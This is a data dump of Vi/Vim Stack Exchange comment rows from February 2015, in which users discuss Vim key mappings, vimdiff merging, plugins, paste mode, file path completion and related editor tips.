  <row Id="752" PostId="504" Score="0" Text="Note: it's not `&lt;C-6&gt;`, it's `&lt;C-^&gt;`. While on many terminal emulators there is no distinction, on some (including the one that ships with OS X), there is. For the latter case, the use of the `Shift` key is required (assuming Qwerty layout)." CreationDate="2015-02-09T11:55:33.430" UserId="64" />
  <row Id="753" PostId="504" Score="0" Text="@tommcdo interesting, I am on osx, but use iterm instead of the terminal.app, it works the same for me. Requiring Shift key on it would be a bummer." CreationDate="2015-02-09T12:18:19.000" UserId="74" />
  <row Id="754" PostId="622" Score="0" Text="It would appear that this is the correct answer. Thanks! I was apparently only copying the first character using `ctrl`+`v` when I should have been using `Shift`+`v`" CreationDate="2015-02-09T13:24:09.677" UserId="416" />
  <row Id="755" PostId="504" Score="0" Text="Come to think of it, it might just be that my OS is grabbing that key binding and not propagating it to Vim. My OS must be stopped!" CreationDate="2015-02-09T13:45:30.150" UserId="64" />
  <row Id="756" PostId="477" Score="0" Text="@Carpetsmoker I don't think the change list contains enough information to implement this feature, even if you could isolate the changes made in each session. It contains a single cursor position for each change, so you can't tell the extent of the edit that was made." CreationDate="2015-02-09T13:59:02.280" UserId="343" />
  <row Id="757" PostId="477" Score="0" Text="@Rich Yes, I came to the same conclusion..." CreationDate="2015-02-09T14:01:50.850" UserId="51" />
  <row Id="758" PostId="477" Score="0" Text="The undo list seems like a better candidate for getting the information required, but again, an awful lot of hackery would be required to actually get the desired functionality." CreationDate="2015-02-09T14:01:54.083" UserId="343" />
  <row Id="760" PostId="542" Score="0" Text="This work nicely; I can open a scratch buffer with the previous revision diffed to the current with `:vsp new`, then `:read !git show HEAD~1:path` and finally `:windo diffthis` (and then using your solution)." CreationDate="2015-02-09T14:23:54.597" UserId="188" />
  <row Id="762" PostId="633" Score="0" Text="Is there a &quot;directory-changed&quot;-like event, while navigatin, which I could bind an autocommand to? Also, does it only work after opening a file?" CreationDate="2015-02-09T14:42:49.350" UserId="188" />
  <row Id="765" PostId="654" Score="5" Text="`ftdetect` is meant for detecting filetypes, use an `ftplugin` instead, there you don't need an `autocmd`, just use `setlocal` instead though." CreationDate="2015-02-09T15:00:41.843" UserId="74" />
  <row Id="766" PostId="398" Score="0" Text="I think this should be possible either by using an &quot;Region End&quot; offset to make the edges exclusive (see `:h :syn-pattern-offset`), or by changing the GitLog region to extend to the end of the file, and the Diff region to be entirely inside the GitLog region. I couldn't get either of these methods to work, though." CreationDate="2015-02-09T15:43:25.663" UserId="343" />
  <row Id="767" PostId="398" Score="0" Text="Testing it was made somewhat harder by the fact that--as you note--git.vim already highlights diff output. Might be an idea to alter your example accordingly!" CreationDate="2015-02-09T15:45:41.813" UserId="343" />
  <row Id="768" PostId="657" Score="3" Text="Not insert mode completions! You need `completeopt` for that." CreationDate="2015-02-09T16:28:44.173" UserId="343" />
  <row Id="769" PostId="633" Score="0" Text="@guido Not that I know of, but the other two answers seem like a possibility for automatic changing" CreationDate="2015-02-09T16:35:11.417" UserId="238" />
  <row Id="770" PostId="657" Score="0" Text="Thanks! wildmode and completeopt are exactly what I was looking for!" CreationDate="2015-02-09T16:44:33.507" UserId="227" />
  <row Id="772" PostId="618" Score="0" Text="While this answer does swap arguments, it doesn't answer the question, which is how to move the last argument to the beginning." CreationDate="2015-02-09T18:38:27.730" UserId="226" />
  <row Id="773" PostId="661" Score="1" Text="If you don't want to use or install Fugitive for some reason, you can also simply set `git config --global merge.tool vimdiff` and then run `git mergetool` to start vim in diff mode." CreationDate="2015-02-09T18:58:26.813" UserId="411" />
  <row Id="774" PostId="660" Score="0" Text="Have you ever given [Meld](http://meldmerge.org/) a try?" CreationDate="2015-02-09T19:02:22.313" UserId="416" />
  <row Id="775" PostId="618" Score="0" Text="@aharris88, you are right. I edited my answer." CreationDate="2015-02-09T19:30:32.760" UserId="356" />
  <row Id="776" PostId="661" Score="0" Text="Does this support the &quot;diff3&quot; style of merge conflicts, where the &quot;merged common ancestors&quot; is shown?" CreationDate="2015-02-09T19:39:24.923" UserId="67" />
  <row Id="777" PostId="660" Score="1" Text="@EricSabelhaus: Is it better than vimdiff at resolving conflicts? This site is about asking/answering questions about vim." CreationDate="2015-02-09T20:41:07.223" UserId="383" />
  <row Id="778" PostId="660" Score="0" Text="It depends on the use case I suppose. If I am working on code that lives remotely, I will most certainly use vimdiff. If I am working locally on my dev machine, I will use Meld, as it provides a feature rich UI to aid the developer in performing complex 3 way merges." CreationDate="2015-02-09T20:45:35.417" UserId="416" />
  <row Id="779" PostId="661" Score="0" Text="@alxndr: I had not heard of diff3 before. But after a quick google. The output of a merge conflict in git (and other source control I have used) is the same as a `diff3 -E`. So the images above are generated from files that have these markers in them." CreationDate="2015-02-09T20:48:25.440" UserId="383" />
  <row Id="780" PostId="660" Score="1" Text="@EricSabelhaus: To me the term `feature rich UI` is misleading; vimdiff may not have a nice UI it is definitely feature rich. I also find vim a much more productive environment that all GUI editors I have used (but I have used it for a long time and it was a steep learning curve). I more curious if Meld does anything that vim does not do that would make it worth while of even looking." CreationDate="2015-02-09T20:51:42.623" UserId="383" />
  <row Id="781" PostId="660" Score="0" Text="I cant specifically say whether it has a more robust feature set, but it is definitely in the same realm as vimdiff." CreationDate="2015-02-09T20:59:51.990" UserId="416" />
  <row Id="782" PostId="574" Score="4" Text="@JoshPetrie Not a duplicate, in my opinion.  This question is more general because there are other ways to indicate the lines are too long. (See the `gitcommit` syntax, for example, which uses syntax highlighting.)" CreationDate="2015-02-09T22:12:25.450" UserId="24" />
  <row Id="783" PostId="667" Score="0" Text="Actually, I'm using spaces to indent instead of tabs. I've updated my question." CreationDate="2015-02-09T22:23:51.403" UserId="226" />
  <row Id="784" PostId="667" Score="0" Text="Oh. Well then, that will require more research." CreationDate="2015-02-09T22:25:50.567" UserId="227" />
  <row Id="785" PostId="549" Score="0" Text="Oh dang, you're totally right. Thanks, I'll edit!" CreationDate="2015-02-09T23:05:53.590" UserId="163" />
  <row Id="786" PostId="667" Score="1" Text="There is a patch to make listchars work for non-trailing spaces, which you can dig up on the mailing list. It has not, however, been accepted into the official distribution :(" CreationDate="2015-02-09T23:52:04.893" UserId="72" />
  <row Id="787" PostId="670" Score="4" Text="Please take a look at our discussion of [plugin-link-only answers](http://meta.vi.stackexchange.com/questions/99/are-answers-offering-plugins-that-address-the-question-link-only-answers) and consider updating your answer with more information." CreationDate="2015-02-10T00:26:19.277" UserId="72" />
  <row Id="788" PostId="390" Score="1" Text="I use pathogen as my plugin loader. But I use git submodules to control the versions of the individual plugins. So its minimalist approach works well for my use case. How do the other managers handle version-ing and plugin updates." CreationDate="2015-02-10T00:40:52.893" UserId="383" />
  <row Id="789" PostId="667" Score="1" Text="Updated answer to include information from Vaibhav Sagar and Josh Petrie. I tried out the plugin Vaibhav mentioned and show the results in the edited answer. I think I'm going to start using this plugin myself. It's not fantastic, but in general seems to work pretty well." CreationDate="2015-02-10T02:11:11.263" UserId="227" />
  <row Id="790" PostId="648" Score="0" Text="Even without filetype-specific indent scripts, `'cindent'` has replaced the functionality of `'smartindent'`." CreationDate="2015-02-10T04:53:33.363" UserId="15" />
  <row Id="791" PostId="661" Score="0" Text="Now that I look closely, the first screenshot shows the diff3 style of merge; the middle top pane &quot;BASE&quot; is the common ancestor, which the left and right panes diverged from." CreationDate="2015-02-10T05:14:10.447" UserId="67" />
  <row Id="792" PostId="572" Score="2" Text="I'm voting to close this question as off-topic because it has nothing to do with text-editing using vim http://meta.vi.stackexchange.com/questions/157/why-was-how-much-money-has-been-raised-for-needy-children-in-uganda-from-vim-c/161#161" CreationDate="2015-02-10T05:18:01.253" UserId="188" />
  <row Id="793" PostId="51" Score="2" Text="Asynchronous tasks should mean no more blocking vim's interface to do work that could be in the background." CreationDate="2015-02-10T05:26:01.553" UserId="67" />
  <row Id="794" PostId="670" Score="0" Text="My mistake, I've updated my answer." CreationDate="2015-02-10T09:52:03.407" UserId="159" />
  <row Id="795" PostId="658" Score="1" Text="Personally I find the less consistent approach of `match`es better, as it highlights only those lines where I am exceeding the 80-column limit, rather than showing a (to me) intrusive big red line on the right of the screen. Hence in my vimrc for Python I use `call matchadd('ColorColumn', '\(\%80v\|\%100v\)')` (80 and 100 being the suggested lengths in PEP 8)" CreationDate="2015-02-10T09:54:34.357" UserId="182" />
  <row Id="796" PostId="662" Score="1" Text="I'm not aware of anything that achieves precisely what you're asking, but there's various fuzzy-file finders that allow you to open files in a similar way. I favour CtrlP, but there's also Command-T and I'm sure there's others I'm forgetting the name of." CreationDate="2015-02-10T09:56:41.727" UserId="343" />
  <row Id="797" PostId="662" Score="1" Text="@Rich As long as I don't have to mash Tab a dozen times, I'd be happy." CreationDate="2015-02-10T09:57:32.103" UserId="205" />
  <row Id="799" PostId="310" Score="0" Text="@muru I'd recommend checking out one of the buffer plugins that is mentioned in the &quot;Stop stop stop&quot; answer you linked to: they'll give you the visual indication you're looking for without trying to force Vim's tabs to work in a way they weren't designed." CreationDate="2015-02-10T10:17:15.877" UserId="343" />
  <row Id="802" PostId="501" Score="3" Text="`:previous` (or `:prev`) is the inverse of `:n`, and goes back a file." CreationDate="2015-02-10T11:12:11.173" UserId="343" />
  <row Id="803" PostId="626" Score="13" Text="You can also use the `:diffthis` command to initiate a diff when Vim is already running." CreationDate="2015-02-10T11:15:34.740" UserId="343" />
  <row Id="804" PostId="390" Score="0" Text="@LokiAstari Vundle and vim-plug have commands for updating plugins. Anything particular you were looking for?" CreationDate="2015-02-10T14:03:45.513" UserId="205" />
  <row Id="805" PostId="676" Score="1" Text="I'd also like to know this for `snake_case`" CreationDate="2015-02-10T14:14:54.463" UserId="51" />
  <row Id="806" PostId="676" Score="0" Text="You may be able to do something with the `iskeyword` setting, but I fear this will have many additional side-effects ... (see `:help word`)." CreationDate="2015-02-10T14:19:19.323" UserId="51" />
  <row Id="807" PostId="676" Score="0" Text="@Carpetsmoker I thought that it worked for `snake_case`. Seems that it doesn't, included it in the quesiton." CreationDate="2015-02-10T14:45:15.593" UserId="79" />
  <row Id="808" PostId="371" Score="0" Text="I've discovered a problem with this: if you open an encrypted file, and you don't want to open it (you forgot the password, wrong file), there's no way to quit! ^C doesn't work, and neither does anything else ... I had to kill Vim from another terminal :-/" CreationDate="2015-02-10T14:46:43.027" UserId="51" />
  <row Id="809" PostId="676" Score="4" Text="VimWiki's got you covered: http://vim.wikia.com/wiki/Moving_through_camel_case_words I'll write up a proper answer at some point if someone else doesn't beat me to it." CreationDate="2015-02-10T14:48:37.650" UserId="343" />
  <row Id="810" PostId="628" Score="0" Text="Thanks for your answer! But I don't think that this snippet is really an &quot;answer&quot;, as such. What do I put in the `insane_in_the_membrane` function? Do I need the  first 3 lines of this snippet? Or are they Startify-specific (what's `Session.vim`?), and the last line gives an error..." CreationDate="2015-02-10T16:01:15.533" UserId="51" />
  <row Id="811" PostId="675" Score="1" Text="`/u*/s*/m*/m*/&lt;Tab&gt;` is how I used to work around bash. It's not a substitute for zsh by a mile. `/usr/**/man&lt;Tab&gt;` is horrendously slow when you have the whole filesystem open, but might be useful for small projects. Unless I misunderstand `:b`, it's not for opening new files." CreationDate="2015-02-10T17:47:34.583" UserId="205" />
  <row Id="812" PostId="675" Score="0" Text="@muru you're right, it's not a substitute to zsh but it's still better than having to type the whole thing yourself, it's about making it easier, `**` is horrendously slow indeed, but works good for regular projects. `:b` is for existing open buffer, that's why using sessions helps." CreationDate="2015-02-10T17:56:15.363" UserId="74" />
  <row Id="813" PostId="668" Score="0" Text="Good! Thinking about it, I included in the list between `[` and `]` after the 9, the char `_` in order to consider as &quot;word&quot; identifiers like foo_bar" CreationDate="2015-02-10T20:43:25.190" UserId="311" />
  <row Id="814" PostId="677" Score="1" Text="Note that this plugin's default mappings shadow the `,` command (repeat last `f`/`t`/`F`/`T` motion), meaning if you want to use that command, you'll have to wait for a delay (configured by `'timeoutlen'`). Fortunately, the plugin allows you to use alternative mappings of your choosing." CreationDate="2015-02-10T22:44:54.627" UserId="64" />
  <row Id="815" PostId="667" Score="0" Text="Is it possible to get the guides to appear on blank lines like they do in sublime?" CreationDate="2015-02-10T22:53:06.287" UserId="462" />
  <row Id="816" PostId="677" Score="0" Text="There seem to be some side-effects with this plugin, ie: `dw` on `, key);` when cursor is at `k` seems to remove the entire line (including newline), while I expected just `key` to be removed..." CreationDate="2015-02-11T00:36:09.397" UserId="51" />
  <row Id="817" PostId="615" Score="0" Text="or `git submodule add` (instead of `git clone`)  if your vim configuration is already part of your own git project." CreationDate="2015-02-11T05:53:07.860" UserId="383" />
  <row Id="819" PostId="13" Score="0" Text="@Rich For example, typing `5j45|` on an emulated keyboard on a touchscreen has a *much* lower information rate (between your brain and your device) as touching the intended character position. On my opinion, a set of similar accelerations would be needed." CreationDate="2015-02-11T09:11:34.230" UserId="28" />
  <row Id="820" PostId="662" Score="0" Text="There is already [a similar question](http://stackoverflow.com/a/15583861/546861) on SO." CreationDate="2015-02-11T09:12:17.097" UserId="54" />
  <row Id="827" PostId="685" Score="1" Text="Thanks! Updated my answer to add the single-quote lines. (Working on the full fix)" CreationDate="2015-02-11T10:48:41.500" UserId="343" />
  <row Id="828" PostId="687" Score="0" Text="Additionally, you may or may not need to `set nocompatible` in your .vimrc file. It's generally good practice to set it unless you absolutely need vi compatibility." CreationDate="2015-02-11T11:08:03.727" UserId="306" />
  <row Id="830" PostId="357" Score="2" Text="Combine that with join &amp; range, and you can have a bunch of columns colored with very little code. My .vimrc has: `execute &quot;set colorcolumn=&quot; . join(range(81,335), ',')`" CreationDate="2015-02-11T11:11:07.043" UserId="306" />
  <row Id="831" PostId="688" Score="0" Text="`awk` is probably the tool for this job. But I'm on Windows (sigh)." CreationDate="2015-02-11T11:11:14.033" UserId="398" />
  <row Id="832" PostId="661" Score="1" Text="It's important to remember that each of these 4 views is just a buffer. This means you can open another tab (or even stay in the same window) and choose only the buffers you want to look at at any given moment. There's no reason to keep all 4 windows open at once if you're not using all of them." CreationDate="2015-02-11T11:15:10.937" UserId="306" />
  <row Id="833" PostId="688" Score="0" Text="Answered [here already](http://stackoverflow.com/questions/252766/add-line-numbers-to-source-code-in-vim), never mind :)" CreationDate="2015-02-11T11:20:15.457" UserId="398" />
  <row Id="836" PostId="191" Score="0" Text="E.g. `vim --startuptime timing.out usual_file.txt`" CreationDate="2015-02-11T11:41:01.810" UserId="467" />
  <row Id="837" PostId="691" Score="1" Text="Powerful stuff, I bow to your mastery. Macros are like black magic to me..." CreationDate="2015-02-11T12:09:58.160" UserId="398" />
  <row Id="843" PostId="691" Score="1" Text="@ropata, a macro is only a sequence of (mostly) normal mode commands." CreationDate="2015-02-11T13:37:15.153" UserId="54" />
  <row Id="844" PostId="649" Score="0" Text="Thanks! I've been using the `'.*\[.*\](.*)'` regexp for the last few days ... This is not a perfect solution, but it's certainly an improvement." CreationDate="2015-02-11T13:46:37.220" UserId="51" />
  <row Id="845" PostId="691" Score="1" Text="@romainl I think it's better to think of it as a sequence of *keystrokes*." CreationDate="2015-02-11T13:47:17.193" UserId="343" />
  <row Id="847" PostId="697" Score="2" Text="In VimScript files, the leading `:` is never necessary for commands." CreationDate="2015-02-11T13:54:48.717" UserId="64" />
  <row Id="848" PostId="697" Score="0" Text="@tommcdo Thanks. For some reason my brain forgets this sometimes &gt;_&lt;" CreationDate="2015-02-11T13:58:08.657" UserId="51" />
  <row Id="849" PostId="700" Score="1" Text="I realize that the asker is using gVim on Windows, so this solution probably won't work there. However, I think it still provides some opportunity for others to learn from it." CreationDate="2015-02-11T14:28:11.210" UserId="64" />
  <row Id="850" PostId="700" Score="0" Text="If you've installed `msysgit` and added that to your PATH (IIRC it's an install option), this solution should also work on Windows." CreationDate="2015-02-11T14:40:54.073" UserId="51" />
  <row Id="851" PostId="700" Score="4" Text="[`cat -n`](http://manpages.ubuntu.com/cat.1posix) is not POSIX, but [`nl`](http://manpages.ubuntu.com/nl.1posix) is, so it might be a better option." CreationDate="2015-02-11T14:43:39.730" UserId="205" />
  <row Id="852" PostId="705" Score="4" Text="Or `&lt;c-v&gt;009` in case of broken Tab key or hardcore ASCII purist :-)" CreationDate="2015-02-11T15:38:42.693" UserId="51" />
  <row Id="856" PostId="707" Score="0" Text="I am officially surprised! Upvoted." CreationDate="2015-02-11T17:55:01.550" UserId="343" />
  <row Id="861" PostId="711" Score="0" Text="This is also a good solution. The other question, which this is a duplicate of, has nice answers too." CreationDate="2015-02-11T20:31:07.387" UserDisplayName="user473" />
  <row Id="862" PostId="711" Score="1" Text="Yes, and mine doesn't quite fit there, that's why I answered here. :)" CreationDate="2015-02-11T20:31:34.093" UserId="205" />
  <row Id="863" PostId="711" Score="0" Text="Thanks. But I think you should add this answer to there too, because this question will be closed as a duplicate most probably. I think yours is a good alternative solution." CreationDate="2015-02-11T20:40:22.450" UserDisplayName="user473" />
  <row Id="865" PostId="711" Score="1" Text="@purplehuman Closed questions will remain on the site, and can still be voted &amp; commented on. The only thing you *can't* do is add new answers." CreationDate="2015-02-11T20:51:50.573" UserId="51" />
  <row Id="866" PostId="711" Score="0" Text="@Carpetsmoker Ah, okay. Good to know. Thanks." CreationDate="2015-02-11T20:53:24.070" UserDisplayName="user473" />
  <row Id="867" PostId="566" Score="3" Text="http://www.vim.org spells it as `gVim` right in the front page in article." CreationDate="2015-02-11T20:54:42.290" UserId="205" />
  <row Id="868" PostId="543" Score="0" Text="Sorry if I sound ignorant. I'm kinda new. But isn't this off-topic? It seems like a git question rather than vi/vim." CreationDate="2015-02-11T21:04:02.787" UserDisplayName="user473" />
  <row Id="869" PostId="699" Score="0" Text="Thank you. After reading your answer I researched a bit and found that while in Insert mode `&lt;c-t&gt;` and `&lt;c-d&gt;` increase or decrease the indentation level. I tried `:h c-d` and I couldn't find more info, though... How could I read more about this on the vim documentation? I suggest you add a bit more info to your answer ;)" CreationDate="2015-02-11T21:16:55.630" UserId="356" />
  <row Id="870" PostId="691" Score="2" Text="@Rich, it can be a sequence of many things, including ex commands." CreationDate="2015-02-11T21:34:27.083" UserId="54" />
  <row Id="871" PostId="714" Score="0" Text="Thanks. Unfortunately I'm out of votes for 2 hours. :) I'll be back." CreationDate="2015-02-11T21:46:26.180" UserDisplayName="user473" />
  <row Id="872" PostId="714" Score="0" Text="All already listed in http://vi.stackexchange.com/a/125/205." CreationDate="2015-02-11T22:12:10.707" UserId="205" />
  <row Id="873" PostId="714" Score="0" Text="Yeah, that site and its questions are a joke." CreationDate="2015-02-11T22:17:51.803" UserId="54" />
  <row Id="874" PostId="718" Score="2" Text="`R` enters Replace Mode. `:help replace-mode` for more information." CreationDate="2015-02-12T00:55:57.290" UserId="67" />
  <row Id="876" PostId="718" Score="0" Text="I tried `vt.rgh`. But the result was the same as yours except for the cursor position." CreationDate="2015-02-12T01:17:13.363" UserId="356" />
  <row Id="877" PostId="719" Score="2" Text="This works for this case. What if you wanted to replace those 2 chars by say 3 chars?" CreationDate="2015-02-12T01:19:04.097" UserId="356" />
  <row Id="878" PostId="719" Score="0" Text="Good question; amended to include a way to handle different length text." CreationDate="2015-02-12T01:22:46.817" UserId="67" />
  <row Id="879" PostId="719" Score="0" Text="Yeah, I know that way. But that way you enter Insert mode and I was curious to see if there was a way not to use Insert mode in that case. Not that I think it very useful (and yet I could be wrong)." CreationDate="2015-02-12T01:26:07.783" UserId="356" />
  <row Id="880" PostId="720" Score="0" Text="I knew about `&lt;C-u&gt;` but I didn't know it could delete the tabs too. I have just tried it: `indent` is needed for it too work. I think this is quicker, as you wrote." CreationDate="2015-02-12T01:55:44.190" UserId="356" />
  <row Id="881" PostId="718" Score="2" Text="Why don't you want to enter insert mode? Something like `cwgh&lt;esc&gt;` would work fine." CreationDate="2015-02-12T02:07:17.370" UserId="88" />
  <row Id="882" PostId="626" Score="4" Text="And :diffoff to turn it off.&#xA;&#xA;I think a link to vim's documentation would be beneficial: http://vimdoc.sourceforge.net/htmldoc/diff.html" CreationDate="2015-02-12T04:49:25.010" UserId="306" />
  <row Id="884" PostId="691" Score="2" Text="@romainl Yes, that's why I think it's best to think of it as keystrokes. It plays back exactly what you type on the keyboard (including, as you say, ex commands), as if you had typed it all in manually." CreationDate="2015-02-12T09:46:35.707" UserId="343" />
  <row Id="885" PostId="708" Score="2" Text="I answered his question, but you've actually figured out what the underlying problem is way better than I did. Goodjob." CreationDate="2015-02-12T09:50:34.447" UserId="343" />
  <row Id="886" PostId="694" Score="1" Text="I like this answer because it doesn't require leaving Vim, which in my opinion is too expensive (my precious buffer list!). I have some notes: (1) leaving buffers without writing requires `'hidden'` to be set; (2) the `: update` command is a slight improvement over `:w` because it only writes if a change has been made, so `:bufdo update` or `:argdo update` will write all modified buffers or arguments." CreationDate="2015-02-12T11:10:45.743" UserId="64" />
  <row Id="887" PostId="694" Score="0" Text="Good point on `update`. I considered mentioning `hidden` when I was writing the answer, but decided against it because I didn't want to overcomplicate it. On reflection though, it should be in there. I'll update the answer to include both suggestions presently." CreationDate="2015-02-12T11:18:10.810" UserId="343" />
  <row Id="888" PostId="694" Score="0" Text="@tommcdo Just checked the documentation for :wall, and it only writes changed buffers, so :bufdo update is not necessary after all." CreationDate="2015-02-12T11:20:03.600" UserId="343" />
  <row Id="890" PostId="694" Score="0" Text="good catch regarding `:wall`, which also has the advantage of not cycling through buffers and moving you away from where you started. I suppose `:argdo update` is still a different story -- maybe you don't want to write to buffers that are not in your argument list." CreationDate="2015-02-12T11:44:34.250" UserId="64" />
  <row Id="891" PostId="694" Score="0" Text="@tommcdo Good point." CreationDate="2015-02-12T11:45:33.193" UserId="343" />
  <row Id="892" PostId="721" Score="0" Text="won't this place him in insert mode?" CreationDate="2015-02-12T12:00:15.650" UserId="342" />
  <row Id="893" PostId="718" Score="1" Text="@durron597 I'm not sure if `minimize-keystrokes` is a good tag, it's usually not really what the question is *about*, as such. (I rejected your proposed edits) ... Perhaps you should discuss at meta?" CreationDate="2015-02-12T13:47:17.870" UserId="51" />
  <row Id="895" PostId="721" Score="1" Text="Ah - didn't catch that part of his question. In that case, yes - R is the most appropriate solution." CreationDate="2015-02-12T15:53:47.210" UserId="306" />
  <row Id="896" PostId="730" Score="1" Text="`:help paste` gives you information on what it affects ... You usually want to enable this *only* for pasting;  ie: `nnoremap &lt;F12&gt; :set paste!&lt;CR&gt;` to toggle it with `F12`." CreationDate="2015-02-12T16:05:23.877" UserId="51" />
  <row Id="897" PostId="731" Score="0" Text="I am GNOME TERMINAL 3.8.4" CreationDate="2015-02-12T16:11:14.577" UserId="486" />
  <row Id="898" PostId="733" Score="3" Text="You can also use `-p` to open in tabs (FYI...)" CreationDate="2015-02-12T16:23:12.910" UserId="51" />
  <row Id="899" PostId="738" Score="4" Text="Using a `-` for stdin is pretty much standard for commandline tools;" CreationDate="2015-02-12T17:15:11.263" UserId="51" />
  <row Id="900" PostId="740" Score="4" Text="Note this will *won't* work in all shells. I think it will only work in `bash` and `zsh` (and not `sh`, `ksh`, `dash`, `fish`, `csh`, `tcsh`, etc.)" CreationDate="2015-02-12T17:17:12.837" UserId="51" />
  <row Id="901" PostId="734" Score="1" Text="Describing something as &quot;the right way&quot; without explaining why or providing a counter-example isn't helpful." CreationDate="2015-02-12T17:58:35.043" UserId="67" />
  <row Id="902" PostId="734" Score="1" Text="I agree with a @alxndr. First off, I do not have Ubuntu, which is stated in my question. Second, there is no context on how to use `&quot;*p`. Do I type it while in view mode? Or add to the `.vimrc`?" CreationDate="2015-02-12T18:23:14.483" UserId="486" />
  <row Id="903" PostId="740" Score="0" Text="@Carpetsmoker Should work in ksh88 and above, I think, but yes, process substitution is not POSIX." CreationDate="2015-02-12T18:41:26.540" UserId="205" />
  <row Id="904" PostId="734" Score="0" Text="@onebree it's like `p`, but for pasting from the OS clipboard. See http://vi.stackexchange.com/q/84/205" CreationDate="2015-02-12T18:44:42.900" UserId="205" />
  <row Id="905" PostId="734" Score="0" Text="Please define that in your answer then." CreationDate="2015-02-12T18:45:19.670" UserId="486" />
  <row Id="907" PostId="741" Score="0" Text="You can tell bash to use vi key bindings instead of emacs.  Use `set -o vi` to turn it on.  Then you can just use the `v` mapping in normal mode to edit the current command in your editor." CreationDate="2015-02-12T19:19:44.587" UserId="93" />
  <row Id="908" PostId="717" Score="0" Text="Thanks very much. I was hoping there would be a better way or that someone had already forked NERDTree on Github to add such an option, but I'll modify my copy of NERDTree." CreationDate="2015-02-12T19:22:39.767" UserId="333" />
  <row Id="910" PostId="741" Score="1" Text="For sure this is a great trick to edit the command line using vi but there are at least two problems using this method to read text from stdin: 1. `shell-expand-line` remove newlines from the expanded text and 2. `edit-and-execute-command` try to execute the command written in the buffer, whatever it is saved or not, when you quit vi." CreationDate="2015-02-12T19:35:45.530" UserId="13" />
  <row Id="911" PostId="734" Score="0" Text="@onebree, no you never mention a distribution in your question." CreationDate="2015-02-12T19:45:04.767" UserId="54" />
  <row Id="912" PostId="740" Score="3" Text="And pay attention to not trick yourself! When you start Vim this way it opens a buffer for a file like `/proc/PID/fd/FD`. If you write the buffer and quit, Vim doesn't complain, but the file you have written to will be removed by the OS. Using `-` as the file name the opened buffer have no file associated with it so if you try to quit without (as long you don't use a bang command or similar) saving Vim will warn you." CreationDate="2015-02-12T19:48:20.737" UserId="13" />
  <row Id="913" PostId="734" Score="0" Text="Corrected that, thank you. I did with one edit, but removed it. I forget the reason... CentOS 7. Hope this helps." CreationDate="2015-02-12T19:49:53.503" UserId="486" />
  <row Id="914" PostId="730" Score="0" Text="Are you pasting while in Insert mode? In Normal mode I always get the indentation as in the yanked text, unless I paste with `]p`, which pastes and adjusts the indentation to be correct." CreationDate="2015-02-12T20:14:03.053" UserId="356" />
  <row Id="915" PostId="742" Score="1" Text="What is a full command? The `dt` is shown because it's the current operator pending. Once it's given a motion, it's no longer an operator pending. Suppose we went further, and did `dt.gU(gu)daw` or so. Is all of that &quot;one full command&quot;, or is it four full commands, or something else?" CreationDate="2015-02-12T20:19:55.600" UserId="130" />
  <row Id="916" PostId="742" Score="0" Text="@mixedmath for me that would count as 4 commands. The second paragraph of the answer tries to disambiguate what I mean." CreationDate="2015-02-12T20:24:09.250" UserId="356" />
  <row Id="917" PostId="742" Score="2" Text="From Vim's perspective, `dt.gU(` are 2 commands: `dt.`  and `gU(`.... So what you really want is show some sort of command history (Vim is already showing the &quot;full comamnds&quot;)." CreationDate="2015-02-12T20:35:16.377" UserId="51" />
  <row Id="920" PostId="743" Score="0" Text="Perhaps version specific. Works fine on 7.4.617, with `vim -u NONE`, and after `:set wc=&lt;Tab&gt;`, `:set path=$PWD/**`." CreationDate="2015-02-12T21:12:27.253" UserId="205" />
  <row Id="921" PostId="743" Score="0" Text="I will check, I also just noticed that the path is changing when I visit a file.. Is there a way to keep the path at what I was when I opened vim?" CreationDate="2015-02-12T21:13:44.237" UserId="489" />
  <row Id="922" PostId="743" Score="1" Text="Perhaps a plugin? My `path` remains the same." CreationDate="2015-02-12T21:16:06.130" UserId="205" />
  <row Id="923" PostId="743" Score="0" Text="It's definitely `vim-classpath`.. Will confirm." CreationDate="2015-02-12T21:16:59.843" UserId="489" />
  <row Id="926" PostId="741" Score="0" Text="Woah, this is awesome. I learn a new thing about readline every day, it seems..." CreationDate="2015-02-12T21:48:32.757" UserId="88" />
  <row Id="927" PostId="655" Score="0" Text="The second command does it; the first will change directory also when opening a file with `vim path/to/file` which I don't want." CreationDate="2015-02-12T22:21:14.950" UserId="188" />
  <row Id="928" PostId="731" Score="0" Text="This should work for you. Gnome Terminal has supported bracketed paste for a while." CreationDate="2015-02-12T22:36:06.520" UserId="411" />
  <row Id="929" PostId="742" Score="0" Text="@Carpetsmoker, yeah, that might be what I want. Thank you for editing the question title." CreationDate="2015-02-12T23:13:44.557" UserId="356" />
  <row Id="930" PostId="321" Score="0" Text="@ideasman42 Right ... I think I originally read this question as &quot;lines *or* words&quot; instead of &quot;lines *and* words&quot; ... In any case, doing this with words is non-obvious, UNIX programs work on lines, and Vim is no exception. I did some experimenting and sort of have a solution, but it doesn't work very well ... Maybe my approach is wrong, so I'll just leave it be for a few days and get back to it later." CreationDate="2015-02-13T00:25:04.587" UserId="51" />
  <row Id="933" PostId="742" Score="3" Text="I've been poking in the Vim source code working on the [normal history](http://vi.stackexchange.com/questions/570/can-i-see-the-history-of-key-presses-in-normal-mode). In `src/normal.c` the code calls `clear_showcmd()` in several places (`normal_cmd()`, `do_pending_operator()`, `end_visual_mode()`). I'm playing with dumping to a file the `showcmd_buf` at those points, which was looking pretty good, but makes me pretty sure that you can't get what you want without similarly modifying the Vim source code and rebuilding it. Of course, doing so might be worth the hassle to make your gifs." CreationDate="2015-02-13T04:57:06.070" UserId="227" />
  <row Id="934" PostId="614" Score="2" Text="It definitely matters if you're using Vi -- the concept of plugins doesn't exist for Vi. Of course, typing `vi` on any modern box will probably just launch `vim` with some features turned off. I doubt many people have access to *actual* Vi these days." CreationDate="2015-02-13T05:04:35.527" UserId="64" />
  <row Id="935" PostId="321" Score="0" Text="@Carpetsmoker not sure UNIX programs working on lines is related. QtCreator for example has this ability to send the selection to the stdout and then replace it with the stdin. It can be a single character or many lines (only the selected portions of partially selected lines). So I think it should be possible to do with vim, without a lot of trouble." CreationDate="2015-02-13T05:27:11.923" UserId="301" />
  <row Id="936" PostId="734" Score="0" Text="@onebree, see my edit." CreationDate="2015-02-13T09:07:29.097" UserId="54" />
  <row Id="937" PostId="734" Score="0" Text="@alxndr, see my edit." CreationDate="2015-02-13T09:07:50.770" UserId="54" />
  <row Id="938" PostId="743" Score="2" Text="You don't need `$PWD/**`, `**` is enough. Also, `.,**` is more useful because it lets you find files in the directory of the current file even if it is not under the working directory." CreationDate="2015-02-13T09:15:33.207" UserId="54" />
